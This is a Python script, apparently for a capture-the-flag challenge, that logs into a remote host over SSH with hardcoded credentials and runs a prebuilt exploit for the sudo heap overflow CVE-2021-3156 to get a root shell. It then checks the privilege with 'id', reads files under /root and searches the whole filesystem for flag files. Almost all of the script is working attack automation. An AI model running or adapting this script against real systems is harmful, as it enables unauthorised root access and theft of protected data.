#!/usr/bin/env python3
"""
Trigger CptGibbon's no-bruteforce CVE-2021-3156 exploit over a real PTY.
On success the shellcode execs a root /bin/sh; we then run enumeration commands.
"""
import sys
import time

import paramiko

HOST = "0.cloud.chals.io"
PORT = 32779
USER = "maya.chen"
PASS = "Onboard-Maya25!"


def drain(chan, secs):
    buf = b""
    end = time.time() + secs
    while time.time() < end:
        try:
            d = chan.recv(65536)
            if not d:
                break
            buf += d
        except Exception:
            time.sleep(0.2)
    return buf.decode(errors="replace")


def main():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=USER, password=PASS,
              timeout=30, allow_agent=False, look_for_keys=False)
    chan = c.invoke_shell()
    chan.settimeout(1)
    time.sleep(1.2)
    try:
        chan.recv(65536)
    except Exception:
        pass

    print("### cd & trigger")
    chan.send("cd /run/lock/cpt && ls -la; ./exploit; echo EXIT_RC=$?\n")
    out = drain(chan, 7)
    print(out)

    if "password" in out.lower():
        print("### exploit missed (password prompt) — aborting")
        c.close()
        return

    print("### verify root + grab flags")
    chan.send("id\n")
    print(drain(chan, 3))
    chan.send("cat /root/root.txt /root/flag.txt /root/flag 2>/dev/null; echo ===; "
              "find / -xdev -iname '*flag*' -exec ls -l {} \\; 2>/dev/null\n")
    print(drain(chan, 8))
    c.close()


if __name__ == "__main__":
    main()
